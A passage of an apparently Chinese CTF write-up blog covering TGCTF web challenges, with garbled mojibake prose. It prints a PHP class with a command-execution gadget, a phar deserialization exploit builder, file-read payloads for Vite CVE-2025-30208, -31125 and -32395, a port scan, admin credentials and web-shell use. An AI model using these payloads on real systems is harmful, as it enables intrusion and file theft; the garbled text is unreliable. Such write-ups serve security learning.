</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">?&gt;
</span></span></code></pre></div><p>class.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">&lt;?php
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">highlight_file<span class="o">(</span>__FILE__<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">error_reporting<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="k">function</span> best64_decode<span class="o">(</span><span class="nv">$str</span><span class="o">)</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="k">return</span> base64_encode<span class="o">(</span>md5<span class="o">(</span>base64_encode<span class="o">(</span>md5<span class="o">(</span><span class="nv">$str</span><span class="o">))))</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">class yesterday <span class="o">{</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    public <span class="nv">$learn</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    public <span class="nv">$study</span><span class="o">=</span><span class="s2">&#34;study&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    public <span class="nv">$try</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    public <span class="k">function</span> __construct<span class="o">()</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="nv">$this</span>-&gt;learn <span class="o">=</span> <span class="s2">&#34;learn&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    public <span class="k">function</span> __destruct<span class="o">()</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;You studied hard yesterday.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span>-&gt;study-&gt;hard<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">class today <span class="o">{</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    public <span class="nv">$doing</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    public <span class="nv">$did</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    public <span class="nv">$done</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">    public <span class="k">function</span> __construct<span class="o">(){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="nv">$this</span>-&gt;did <span class="o">=</span> <span class="s2">&#34;What you did makes you outstanding.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    public <span class="k">function</span> __call<span class="o">(</span><span class="nv">$arg1</span>, <span class="nv">$arg2</span><span class="o">)</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="o">{</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="nv">$this</span>-&gt;done <span class="o">=</span> <span class="s2">&#34;And what you&#39;ve done has given you a choice.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">        <span class="nb">echo</span> <span class="nv">$this</span>-&gt;done<span class="p">;</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">if</span><span class="o">(</span>md5<span class="o">(</span>md5<span class="o">(</span><span class="nv">$this</span>-&gt;doing<span class="o">))==</span>666<span class="o">){</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="k">return</span> <span class="nv">$this</span>-&gt;doing<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="k">else</span><span class="o">{</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">            <span class="k">return</span> <span class="nv">$this</span>-&gt;doing-&gt;better<span class="p">;</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">41</span><span class="cl">class tommoraw <span class="o">{</span>
</span></span><span class="line"><span class="ln">42</span><span class="cl">    public <span class="nv">$good</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">43</span><span class="cl">    public <span class="nv">$bad</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">44</span><span class="cl">    public <span class="nv">$soso</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">45</span><span class="cl">    public <span class="k">function</span> __invoke<span class="o">(){</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">        <span class="nv">$this</span>-&gt;good<span class="o">=</span><span class="s2">&#34;You&#39;ll be good tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl">        <span class="nb">echo</span> <span class="nv">$this</span>-&gt;good<span class="p">;</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl">    public <span class="k">function</span> __get<span class="o">(</span><span class="nv">$arg1</span><span class="o">){</span>
</span></span><span class="line"><span class="ln">50</span><span class="cl">        <span class="nv">$this</span>-&gt;bad<span class="o">=</span><span class="s2">&#34;You&#39;ll be bad tommoraw!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">51</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl">
</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">54</span><span class="cl">class future<span class="o">{</span>
</span></span><span class="line"><span class="ln">55</span><span class="cl">    private <span class="nv">$impossible</span><span class="o">=</span><span class="s2">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl">    private <span class="nv">$out</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">57</span><span class="cl">    private <span class="nv">$no</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">58</span><span class="cl">    public <span class="nv">$useful1</span><span class="p">;</span>public <span class="nv">$useful2</span><span class="p">;</span>public <span class="nv">$useful3</span><span class="p">;</span>public <span class="nv">$useful4</span><span class="p">;</span>public <span class="nv">$useful5</span><span class="p">;</span>public <span class="nv">$useful6</span><span class="p">;</span>public <span class="nv">$useful7</span><span class="p">;</span>public <span class="nv">$useful8</span><span class="p">;</span>public <span class="nv">$useful9</span><span class="p">;</span>public <span class="nv">$useful10</span><span class="p">;</span>public <span class="nv">$useful11</span><span class="p">;</span>public <span class="nv">$useful12</span><span class="p">;</span>public <span class="nv">$useful13</span><span class="p">;</span>public <span class="nv">$useful14</span><span class="p">;</span>public <span class="nv">$useful15</span><span class="p">;</span>public <span class="nv">$useful16</span><span class="p">;</span>public <span class="nv">$useful17</span><span class="p">;</span>public <span class="nv">$useful18</span><span class="p">;</span>public <span class="nv">$useful19</span><span class="p">;</span>public <span class="nv">$useful20</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">59</span><span class="cl">
</span></span><span class="line"><span class="ln">60</span><span class="cl">    public <span class="k">function</span> __set<span class="o">(</span><span class="nv">$arg1</span>, <span class="nv">$arg2</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="nv">$this</span>-&gt;out-&gt;useful7<span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="ln">62</span><span class="cl">            <span class="nb">echo</span> <span class="s2">&#34;Seven is my lucky number&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">            system<span class="o">(</span><span class="s1">&#39;whoami&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">64</span><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="ln">65</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">    public <span class="k">function</span> __toString<span class="o">(){</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">        <span class="nb">echo</span> <span class="s2">&#34;This is your future.&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">68</span><span class="cl">        system<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s2">&#34;wow&#34;</span><span class="o">])</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">69</span><span class="cl">        <span class="k">return</span> <span class="s2">&#34;win&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">70</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl">    public <span class="k">function</span> __destruct<span class="o">(){</span>
</span></span><span class="line"><span class="ln">72</span><span class="cl">        <span class="nv">$this</span>-&gt;no <span class="o">=</span> <span class="s2">&#34;no&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">73</span><span class="cl">        <span class="k">return</span> <span class="nv">$this</span>-&gt;no<span class="p">;</span>
</span></span><span class="line"><span class="ln">74</span><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="ln">75</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">76</span><span class="cl"><span class="k">if</span> <span class="o">(</span>file_exists<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;filename&#39;</span><span class="o">])){</span>
</span></span><span class="line"><span class="ln">77</span><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;Focus on the previous step!&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">78</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">79</span><span class="cl"><span class="k">else</span><span class="o">{</span>
</span></span><span class="line"><span class="ln">80</span><span class="cl">    <span class="nv">$data</span><span class="o">=</span>substr<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;filename&#39;</span><span class="o">]</span>,0,-4<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">81</span><span class="cl">    unserialize<span class="o">(</span>best64<span class="o">(</span><span class="nv">$data</span><span class="o">))</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">82</span><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="ln">83</span><span class="cl">// You learn yesterday, you choose today, can you get to your future?
</span></span><span class="line"><span class="ln">84</span><span class="cl">?&gt;
</span></span></code></pre></div><p>è¿™é¢˜æŠŠç›´æ¥ååºåˆ—åŒ–å†™æ­»äº†</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨file_existså’Œæ–‡ä»¶ä¸Šä¼ æ‰“pharååºåˆ—åŒ–</p>
<p>æ‹¿ä¸Šä¸€é¢˜çš„expæ”¹ä¸€æ”¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c++" data-lang="c++"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="n">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">class</span> <span class="nc">yesterday</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">public</span> <span class="err">$</span><span class="n">learn</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">public</span> <span class="err">$</span><span class="n">study</span><span class="o">=</span><span class="s">&#34;study&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="k">public</span> <span class="err">$</span><span class="k">try</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">class</span> <span class="nc">today</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">public</span> <span class="err">$</span><span class="n">doing</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">public</span> <span class="err">$</span><span class="n">did</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">public</span> <span class="err">$</span><span class="n">done</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="k">class</span> <span class="nc">future</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">private</span> <span class="err">$</span><span class="n">impossible</span><span class="o">=</span><span class="s">&#34;How can you get here?&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">private</span> <span class="err">$</span><span class="n">out</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="k">private</span> <span class="err">$</span><span class="n">no</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="err">$</span><span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">yesterday</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="err">$</span><span class="n">a</span> <span class="o">-&gt;</span> <span class="n">study</span> <span class="o">=</span> <span class="k">new</span> <span class="n">today</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="err">$</span><span class="n">a</span> <span class="o">-&gt;</span> <span class="n">study</span> <span class="o">-&gt;</span> <span class="n">doing</span> <span class="o">=</span> <span class="k">new</span> <span class="n">future</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="err">$</span><span class="n">phar</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Phar</span><span class="p">(</span><span class="s">&#34;1.phar&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="err">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">startBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="err">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">setStub</span><span class="p">(</span><span class="s">&#34;&lt;php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span> <span class="c1">//è®¾ç½®stub
</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="c1"></span><span class="err">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">setMetadata</span><span class="p">(</span><span class="err">$</span><span class="n">a</span><span class="p">);</span> <span class="c1">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="c1"></span><span class="err">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">addFromString</span><span class="p">(</span><span class="s">&#34;a&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">);</span>  <span class="c1">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="c1"></span><span class="err">$</span><span class="n">phar</span><span class="o">-&gt;</span><span class="n">stopBuffering</span><span class="p">();</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="o">?&gt;</span>
</span></span></code></pre></div><p>æ”¹ä¸º1.atgæ–‡ä»¶ä¸Šä¼ åˆ°uploadsç›®å½•</p>
<p>åœ¨class.phpå¤„ä¼ å…¥</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">?filename<span class="o">=</span>phar://./uploads/1.atg
</span></span></code></pre></div><p>å®ç°RCE</p>
<h3 id="å‰ç«¯game"><strong>å‰ç«¯GAME</strong><a hidden class="anchor" aria-hidden="true" href="#å‰ç«¯game">#</a></h3>
<p>CVE-2025-30208</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">URL/@fs/tgflagggg?import<span class="p">&amp;</span>raw??
</span></span></code></pre></div><h3 id="å‰ç«¯game-plus"><strong>å‰ç«¯GAME Plus</strong><a hidden class="anchor" aria-hidden="true" href="#å‰ç«¯game-plus">#</a></h3>
<p>CVE-2025-31125</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">URL/@fs/tgflagggg?meteorkai.svg?.wasm?init
</span></span></code></pre></div><h3 id="å‰ç«¯game-ultra"><strong>å‰ç«¯GAME Ultra</strong><a hidden class="anchor" aria-hidden="true" href="#å‰ç«¯game-ultra">#</a></h3>
<p><a href="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA">https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA</a></p>
<p>CVE-2025-32395</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">curl --request-target /@fs/app/#/../../../../../tgflagggg URL
</span></span></code></pre></div><h3 id="tg_"><strong>TG_wordpress</strong><a hidden class="anchor" aria-hidden="true" href="#tg_">#</a></h3>
<p>åœ¨robots.txté‡Œé¢çœ‹åˆ°è¿™ä¸¤ä¸ª</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-4.png"></p>
<p>/.tmp/vulnå’Œ/.tmp/.bak</p>
<p>ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶å’Œä¸€ä¸ªfscançš„æ‰«æç»“æœ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="ln"> 1</span><span class="cl">fscan.exe -h 101.37.149.223 -ping
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">   ___                              _
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  / _ \     <span class="gs">___  ___</span> _ <span class="ge">__</span> <span class="ge">__</span> _  <span class="gs">___| | __</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"> / /_\/____/ <span class="ge">__</span>|/ <span class="ge">__</span>| &#39;__/ _` |/ <span class="ge">__</span>| |/ /
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">/ /_\\_____\__ \ (__| | | (_| | (__|   <span class="p">&lt;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">\_<span class="nt">___</span><span class="err">/</span>     <span class="err">|</span><span class="na">___</span><span class="err">/</span>\_<span class="na">__</span><span class="err">|</span><span class="na">_</span><span class="err">|</span>  \_<span class="na">_</span><span class="err">,</span><span class="na">_</span><span class="err">|</span>\_<span class="na">__</span><span class="err">|</span><span class="na">_</span><span class="err">|</span>\_<span class="err">\</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">                     <span class="na">fscan</span> <span class="na">version:</span> <span class="na">1</span><span class="err">.</span><span class="na">8</span><span class="err">.</span><span class="na">4</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="na">start</span> <span class="na">infoscan</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:22</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:80</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:443</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:3306</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27645</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27646</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27647</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27648</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27649</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27650</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27651</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27652</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27653</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27654</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27655</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27656</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27657</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27658</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27659</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27660</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27661</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:27662</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:33376</span> <span class="na">open</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="na">101</span><span class="err">.</span><span class="na">37</span><span class="err">.</span><span class="na">149</span><span class="err">.</span><span class="na">223:52013</span> <span class="na">open</span>
</span></span></code></pre></div><p>çŒœåˆ°è¦æ‰“pwn</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-5.png"></p>
<p>nc 101.37.149.223 52013</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-6.png"></p>
<p>éªŒè¯çŒœæƒ³</p>
<p>é™æ€ç¼–è¯‘ï¼Œè€Œä¸”ä¸»å‡½æ•°åªæœ‰ä¸€ä¸ªget</p>
<p>ç›´æ¥ROPgadget&ndash;ropchainæ¢­å“ˆ</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-7.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">==================================</span> + HINT<span class="o">(</span>not flag/FLAG<span class="o">)</span>: + username/password: + TG_wordpressor + aXx^oV@K<span class="p">&amp;</span>cFoVaztQ* + + All hints have the same content + obtaining one is <span class="nv">enough</span> <span class="o">==================================</span>
</span></span></code></pre></div><p>æ‹¿åˆ°åå°è´¦æˆ·å¯†ç </p>
<p>TG_wordpressor/aXx^oV@K&amp;cFoVaztQ*</p>
<p>ç™»è¿›åå°æ‰¾åˆ°æ’ä»¶åˆ—è¡¨ wp-file-managerç‰ˆæœ¬ä¸º6.0</p>
<p><a href="https://blog.csdn.net/hongduilanjun/article/details/132851717">https://blog.csdn.net/hongduilanjun/article/details/132851717</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">tgctf<span class="o">{</span>CVE-2020-25213<span class="o">}</span>
</span></span></code></pre></div><h3 id="ç«çœ¼è¾©é­‘é­…"><strong>ç«çœ¼è¾©é­‘é­…</strong><a hidden class="anchor" aria-hidden="true" href="#ç«çœ¼è¾©é­‘é­…">#</a></h3>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-8.png"></p>
<p>tgshell.php</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-9.png"></p>
<p>ç›´æ¥è¿èšå‰‘è¯»flagäº†</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-10.png"></p>
<h3 id="ç›´é¢å¤©å‘½"><strong>ç›´é¢å¤©å‘½</strong><a hidden class="anchor" aria-hidden="true" href="#ç›´é¢å¤©å‘½">#</a></h3>
<p><img alt="img" loading="lazy" src="../assets/1744970124055-11.png"></p>
<p>æŠŠè·¯ç”±çˆ†ç ´å‡ºæ¥ï¼Œ/aazz</p>
<p><img alt="img" loading="lazy" src="../assets/1744970124056-12.png"></p>
<p><img alt="img" loading="lazy" src="../assets/1744970124056-13.png"></p>
<p>ç›´æ¥è¯»flagå³å¯</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">?filename<span class="o">=</span>/flag
</span></span><span class="line"><span class="ln">2</span><span class="cl">//TGCTF<span class="o">{</span>05ee064a-ef29-6e6c-718e-746b002f727e<span class="o">}</span>
</span></span></code></pre></div><h3 id="ç›´é¢å¤©å‘½å¤ä»‡"><strong>ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰</strong><a hidden class="anchor" aria-hidden="true" href="#ç›´é¢å¤©å‘½å¤ä»‡">#</a></h3>
<p>æºç </p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">send_from_directory</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="kn">from</span> <span class="nn">a.b.c.d.secret</span> <span class="kn">import</span> <span class="n">secret_key</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
